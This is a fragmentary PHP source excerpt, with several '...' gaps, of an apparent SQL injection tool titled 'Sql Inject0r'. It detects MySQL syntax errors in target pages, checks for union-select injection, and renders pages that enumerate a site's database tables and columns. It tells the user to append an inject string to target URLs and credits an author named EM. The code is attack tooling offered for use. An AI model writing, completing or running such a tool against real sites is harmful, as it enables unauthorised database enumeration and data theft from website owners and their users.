				...
				if (preg_match("/\bYou\shave\san\serror\sin\syour\sSQL\ssyntax\b/i", $html)) // Detect Sql Error 
					 		{
								...
								print "<html> <head><title>[~ Sql Inject0r ~]</head></head><body bgcolor='black'>";
								print "<center><a href='' STYLE='text-decoration:none'>[ <font color='red'>Server Information </font> ]</a> | <a STYLE='text-decoration:none' href='javascript:toggle();' id='displayText'> [ <font color='#7A7AF7'>Get Database</font> ] </a> | <a STYLE='text-decoration:none' href='index.php'> [ <font color='red'>Home</font> ] </a>  </center> <br>";
							...
							{
							echo "<font color='green'>Mysql Error Not Found !</font>";
							}
				}
		else 
				{
				echo "<font color='green'>Please Insert Inject String At The End Of the URL like ?ID=inject !<br></font>";
				}
	} 
...
if(isset($db))
{
	...
	if (preg_match("/\bunion\b/i", $union_select_link))
					...
					print "<html> <head><title>[~ Sql Inject0r ~]</head></head><body bgcolor='black'>";
					print "<center><a href='javascript:back();' STYLE='text-decoration:none'>[ <font color='red'>Back</font> ]</a>";
					...
					print "<tr><td><a style='text-decoration: none;' href='dosql.php?db=$db&options=$option&col=$visible_col&table=$splited_table[$c]&column=$splited_column[$c]&link2=$disp_table'><center>".$get_table_col[$c]."</a></td</tr></center>";
						...
						print "</table>";
						$c=$c-1;
						print "<font color='red'>Total Column count Is ".$c."</font>";
...
<pre>
Author : EM
Email : mrpotmods:gmail.com
If you're modifying this code then please give credit to the original author EM </pre>
